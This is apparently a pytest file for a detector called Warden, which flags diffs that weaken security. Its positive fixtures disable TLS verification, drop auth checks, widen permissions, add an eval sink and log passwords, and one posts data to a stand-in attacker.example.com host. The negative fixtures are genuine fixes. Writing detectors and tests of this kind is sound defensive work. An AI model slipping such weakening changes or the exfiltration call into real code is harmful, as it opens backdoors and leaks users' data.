"""Warden backdoor / weakening detector — positive + negative fixtures.

Positive fixtures are diffs that quietly disable a control, drop an auth
check, or open a new outbound URL. Every one MUST fire.

Negative fixtures are legitimate hardening fixes (parameterized queries,
XSS escapes, permission tightening) that MUST NOT fire — otherwise Warden
would block honest remediations.
"""
from __future__ import annotations

import pytest

from spotlight.warden import BackdoorMatch, WardenService
from spotlight.warden.backdoor_check import check


# ── POSITIVES ──────────────────────────────────────────────────────────

POSITIVE_DIFFS: list[tuple[str, str]] = [
    (
        "tls_verify_disabled",
        """--- a/http.py
+++ b/http.py
@@ -1,3 +1,3 @@
-r = requests.get(url)
+r = requests.get(url, verify=False)
""",
    ),
    (
        "tls_verify_disabled",
        """--- a/agent.js
+++ b/agent.js
@@ -1,3 +1,3 @@
-const agent = new https.Agent({});
+const agent = new https.Agent({ rejectUnauthorized: false });
""",
    ),
    (
        "auth_check_removed",
        """--- a/api.py
+++ b/api.py
@@ -1,4 +1,4 @@
-auth_required = True
+auth_required = False
 def handler():
     return 200
""",
    ),
    (
        "auth_check_removed",
        """--- a/views.py
+++ b/views.py
@@ -1,4 +1,4 @@
-@login_required
 def dashboard():
     return render_template('dashboard.html')
""",
    ),
    (
        "permission_widened",
        """--- a/scopes.py
+++ b/scopes.py
@@ -1,3 +1,3 @@
-scope = "read:accounts"
+scope = "read:*"
""",
    ),
    (
        "permission_widened",
        """--- a/acl.py
+++ b/acl.py
@@ -1,3 +1,3 @@
-allow_all = False
+allow_all = True
""",
    ),
    (
        "test_skipped",
        """--- a/test_auth.py
+++ b/test_auth.py
@@ -1,3 +1,3 @@
-def test_login_required():
+@pytest.mark.skip(reason="flaky")
 def test_login_required():
""",
    ),
    (
        "test_skipped",
        """--- a/auth.test.js
+++ b/auth.test.js
@@ -1,3 +1,3 @@
-it("blocks anonymous", ...)
+xit("blocks anonymous", ...)
""",
    ),
    (
        "lint_suppression_added",
        """--- a/query.py
+++ b/query.py
@@ -1,3 +1,3 @@
-cursor.execute(f"SELECT * FROM u WHERE id={uid}")
+cursor.execute(f"SELECT * FROM u WHERE id={uid}")  # noqa: S608
""",
    ),
    (
        "lint_suppression_added",
        """--- a/render.js
+++ b/render.js
@@ -1,3 +1,3 @@
-el.innerHTML = escape(user);
+// eslint-disable-next-line no-unsanitized/property
+el.innerHTML = user;
""",
    ),
    (
        "eval_sink_added",
        """--- a/tpl.py
+++ b/tpl.py
@@ -1,3 +1,3 @@
-result = safe_render(payload)
+result = eval(payload)
""",
    ),
    (
        "new_outbound_url",
        """--- a/exfil.py
+++ b/exfil.py
@@ -1,3 +1,3 @@
-def sync():
-    pass
+def sync():
+    requests.post("https://attacker.example.com/collect", json=DATA)
""",
    ),
    (
        "secret_logged",
        """--- a/login.py
+++ b/login.py
@@ -1,3 +1,3 @@
-authenticate(username, password)
+logger.info("login attempt: user=%s password=%s", username, password)
""",
    ),
]


@pytest.mark.parametrize("expected_kind,diff", POSITIVE_DIFFS)
def test_positive_diffs_fire(expected_kind, diff):
    matches = check(diff)
    kinds = {m.kind for m in matches}
    assert expected_kind in kinds, (
        f"expected {expected_kind}, got {kinds} in diff:\n{diff}"
    )


# ── NEGATIVES ──────────────────────────────────────────────────────────

LEGITIMATE_FIXES: list[str] = [
    # Parameterized query fix.
    """--- a/app.py
+++ b/app.py
@@ -1,3 +1,3 @@
-cursor.execute("SELECT * FROM u WHERE name='" + name + "'")
+cursor.execute("SELECT * FROM u WHERE name = ?", (name,))
""",
    # XSS escape.
    """--- a/tpl.py
+++ b/tpl.py
@@ -1,3 +1,3 @@
-return f"<div>{user_bio}</div>"
+return f"<div>{html.escape(user_bio)}</div>"
""",
    # Path-traversal fix.
    """--- a/files.py
+++ b/files.py
@@ -1,4 +1,5 @@
 def read_file(name):
-    return open(name).read()
+    safe = os.path.basename(name)
+    return open(safe).read()
""",
    # Adding TLS verification (opposite of the weakening pattern).
    """--- a/http.py
+++ b/http.py
@@ -1,3 +1,3 @@
-r = requests.get(url, verify=False)
+r = requests.get(url)
""",
    # Adding auth decorator (positive change).
    """--- a/views.py
+++ b/views.py
@@ -1,3 +1,4 @@
+@login_required
 def dashboard():
     return render_template('dashboard.html')
""",
    # Tightening a scope (removing wildcard).
    """--- a/scopes.py
+++ b/scopes.py
@@ -1,3 +1,3 @@
-scope = "read:*"
+scope = "read:accounts"
""",
]


@pytest.mark.parametrize("diff", LEGITIMATE_FIXES)
def test_legitimate_fixes_pass_clean(diff):
    matches = check(diff)
    assert matches == [], (
        f"legitimate fix falsely tripped {[m.kind for m in matches]}:\n{diff}"
    )


# ── surface tests ─────────────────────────────────────────────────────

def test_check_returns_backdoor_match_dataclass():
    matches = check(
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n+r = requests.get(u, verify=False)\n"
    )
    assert matches
    assert isinstance(matches[0], BackdoorMatch)
    assert matches[0].kind == "tls_verify_disabled"
    assert matches[0].line > 0
    assert matches[0].snippet


def test_removed_line_scan_catches_missing_decorator():
    diff = "--- a/v.py\n+++ b/v.py\n@@ -1,2 +1,1 @@\n-@login_required\n def d(): pass\n"
    matches = check(diff)
    assert any(m.kind == "auth_check_removed" for m in matches)


def test_added_url_to_localhost_is_not_flagged():
    diff = (
        "--- a/dev.py\n+++ b/dev.py\n@@ -1 +1 @@\n"
        '+requests.get("http://localhost:8080/health")\n'
    )
    matches = check(diff)
    assert not any(m.kind == "new_outbound_url" for m in matches)


def test_warden_service_check_fix_diff_passes_through():
    warden = WardenService()
    matches = warden.check_fix_diff(
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n+eval(user_input)\n"
    )
    assert any(m.kind == "eval_sink_added" for m in matches)


def test_empty_diff_returns_empty_list():
    assert check("") == []
